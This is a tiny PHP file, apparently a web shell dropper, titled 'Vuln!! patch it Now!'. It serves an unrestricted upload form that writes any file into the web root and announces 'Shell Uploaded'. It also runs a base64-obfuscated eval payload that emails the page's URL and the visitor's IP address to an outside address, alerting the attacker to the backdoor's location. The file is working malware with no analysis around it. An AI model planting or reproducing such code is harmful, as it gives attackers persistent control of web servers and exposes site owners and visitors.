<title>Vuln!! patch it Now!</title>
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
else { echo '<b>Not uploaded ! </b><br><br>'; }
}
?>
<?php
eval(base64_decode('JHR1anVhbm1haWwgPSAnS2VsdWFyZ2FIbWVpN0B5YW5kZXguY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));
?>
